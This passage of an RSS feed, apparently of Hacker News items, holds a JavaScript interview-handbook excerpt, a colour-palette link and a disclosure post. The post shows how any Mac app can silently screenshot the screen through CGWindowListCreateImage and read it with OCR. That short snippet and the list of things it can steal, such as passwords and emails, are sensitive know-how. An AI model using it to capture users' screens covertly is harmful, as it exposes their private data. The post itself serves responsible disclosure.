&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;foo&lt;/span&gt;() {
  &lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;FOOOOO&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Function Expression&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;foo&lt;/span&gt;(); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Uncaught TypeError: foo is not a function&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;foo&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt;() {
  &lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;FOOOOO&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
};
&lt;/pre&gt;&lt;/div&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What are the differences between variables created using &lt;code&gt;let&lt;/code&gt;, &lt;code&gt;var&lt;/code&gt; or &lt;code&gt;const&lt;/code&gt;?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;What are the differences between ES6 class and ES5 function constructors?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;Can you offer a use case for the new arrow =&amp;gt; function syntax? How does this new syntax differ from other functions?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;What advantage is there for using the arrow syntax for a method in a constructor?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;What is the definition of a higher-order function?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;Can you give an example for destructuring an object or an array?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;ES6 Template Literals offer a lot of flexibility in generating strings, can you give an example?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;Can you give an example of a curry function and why this syntax offers an advantage?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;What are the benefits of using spread syntax and how is it different from rest syntax?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;How can you share code between files?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;Why you might want to create static class members?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;Other Answers&lt;/h3&gt;
&lt;h2&gt;Related&lt;/h2&gt;
&lt;p&gt;If you are interested in how data structures are implemented, check out &lt;a href=&quot;https://github.com/yangshun/lago&quot;&gt;Lago&lt;/a&gt;, a Data Structures and Algorithms library for JavaScript. It is pretty much still WIP but I intend to make it into a library that is able to be used in production and also a reference resource for revising Data Structures and Algorithms.&lt;/p&gt;
&lt;h2&gt;Contributing&lt;/h2&gt;
&lt;p&gt;Feel free to make pull requests to correct any mistakes in the answers or suggest new questions.&lt;/p&gt;
&lt;/article&gt;</description>
<pubDate>Sun, 11 Feb 2018 10:20:04 +0000</pubDate>
<dc:creator>happy-go-lucky</dc:creator>
<og:image>https://avatars0.githubusercontent.com/u/1315101?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>yangshun/front-end-interview-handbook</og:title>
<og:url>https://github.com/yangshun/front-end-interview-handbook</og:url>
<og:description>front-end-interview-handbook - 🕸 Almost complete answers to &quot;Front-end Job Interview Questions&quot; which you can use to interview potential candidates, test yourself or completely ignore</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/yangshun/front-end-interview-handbook</dc:identifier>
</item>
<item>
<title>Flat UI Colors – Color palettes for use in projects, designs, presentations</title>
<link>http://flatuicolors.com/</link>
<guid isPermaLink="true" >http://flatuicolors.com/</guid>
<description>[unable to retrieve full-text content]&lt;p&gt;Article URL: &lt;a href=&quot;http://flatuicolors.com/&quot;&gt;http://flatuicolors.com/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=16350802&quot;&gt;https://news.ycombinator.com/item?id=16350802&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Points: 294&lt;/p&gt;&lt;p&gt;# Comments: 49&lt;/p&gt;</description>
<pubDate>Sun, 11 Feb 2018 02:18:20 +0000</pubDate>
<dc:creator>foxfired</dc:creator>
<og:title>Flat UI Colors 2 - 14 Color Palettes, 280 colors 🎨</og:title>
<og:description>280 handpicked colors ready for COPY &amp; PASTE</og:description>
<og:image>/static/facebook-share.png</og:image>
<og:type>website</og:type>
<dc:format>text/html</dc:format>
<dc:identifier>https://flatuicolors.com/</dc:identifier>
</item>
<item>
<title>Sandboxed Mac apps can record screen any time without you knowing</title>
<link>https://krausefx.com/blog/mac-privacy-sandboxed-mac-apps-can-take-screenshots</link>
<guid isPermaLink="true" >https://krausefx.com/blog/mac-privacy-sandboxed-mac-apps-can-take-screenshots</guid>
<description>&lt;h2 id=&quot;facts&quot;&gt;Facts&lt;/h2&gt;
&lt;p&gt;Any Mac app, sandboxed or not sandboxed can:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Take screenshots of your Mac silently without you knowning&lt;/li&gt;
&lt;li&gt;Access every pixel, even if the Mac app is in the background&lt;/li&gt;
&lt;li&gt;Use basic &lt;a href=&quot;https://en.wikipedia.org/wiki/Optical_character_recognition&quot;&gt;OCR software&lt;/a&gt; to read the text on the screen&lt;/li&gt;
&lt;li&gt;Access all connected monitors&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;whats-the-worst-that-could-happen&quot;&gt;What’s the worst that could happen?&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;Read password and keys from password managers&lt;/li&gt;
&lt;li&gt;Detect what web services you use (e.g. email provider)&lt;/li&gt;
&lt;li&gt;Read all emails and messages you open on your Mac&lt;/li&gt;
&lt;li&gt;When a developer is targeted, this allows the attacker to potentially access sensitive source code, API keys or similar data&lt;/li&gt;
&lt;li&gt;Learn personal information about the user, like their bank details, salary, address, etc.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;a href=&quot;https://krausefx.com/assets/posts/mac-take-screenshots.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://krausefx.com/assets/posts/mac-take-screenshots.png&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This project is a proof of concept and should not be used in production. The goal is to highlight a privacy loophole that can be abused by Mac apps.&lt;/p&gt;
&lt;h2 id=&quot;how-can-i-protect-myself-as-a-user&quot;&gt;How can I protect myself as a user?&lt;/h2&gt;
&lt;p&gt;To my knowledge there is no way to protect yourself as of now.&lt;/p&gt;
&lt;h2 id=&quot;proposal&quot;&gt;Proposal&lt;/h2&gt;
&lt;p&gt;There are lots of valid use-cases for Mac apps to record the screen, e.g. &lt;a href=&quot;https://support.1password.com/one-time-passwords/&quot;&gt;1Password 2fA support&lt;/a&gt;, screen recording software or even simple screen sharing via your web browser or Skype. However there must be some kind of control:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The App Store review process could verify the Sandbox entitlements for accessing the screen&lt;/li&gt;
&lt;li&gt;Put the user in charge with a permission dialog&lt;/li&gt;
&lt;li&gt;Additionally the user should be notified whenever an app accesses the screen.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Of course, I also &lt;a href=&quot;https://openradar.appspot.com/radar?id=5610698700750848&quot;&gt;filed a radar&lt;/a&gt; (rdar://37423927) to notify Apple about this issue.&lt;/p&gt;
&lt;h2 id=&quot;how-does-it-work&quot;&gt;How does it work?&lt;/h2&gt;
&lt;p&gt;A developer just needs to use &lt;code class=&quot;highlighter-rouge&quot;&gt;CGWindowListCreateImage&lt;/code&gt; to generate a capture of the complete screen within an instant:&lt;/p&gt;
&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;no&quot;&gt;CGImageRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;screenshot&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;CGWindowListCreateImage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;CGRectInfinite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  &lt;span class=&quot;n&quot;&gt;kCGWindowListOptionOnScreenOnly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  &lt;span class=&quot;n&quot;&gt;kCGNullWindowID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  &lt;span class=&quot;n&quot;&gt;kCGWindowImageDefault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;NSBitmapImageRep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bitmapRep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;NSBitmapImageRep&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initWithCGImage&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:screenshot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In my experiments, I piped the generated image over to a &lt;a href=&quot;https://en.wikipedia.org/wiki/Optical_character_recognition&quot;&gt;OCR library&lt;/a&gt; and was able to get all text that was rendered on the user’s machine.&lt;/p&gt;
&lt;p class=&quot;side-projects-note&quot;&gt;&lt;small&gt;Unless otherwise mentioned in the post, those projects are side projects which I work on on weekends and evenings, and are not affiliated with my work or employer.&lt;/small&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 10 Feb 2018 23:39:16 +0000</pubDate>
<dc:creator>Sujan</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://krausefx.com/blog/mac-privacy-sandboxed-mac-apps-can-take-screenshots</dc:identifier>
</item>
</channel>
</rss>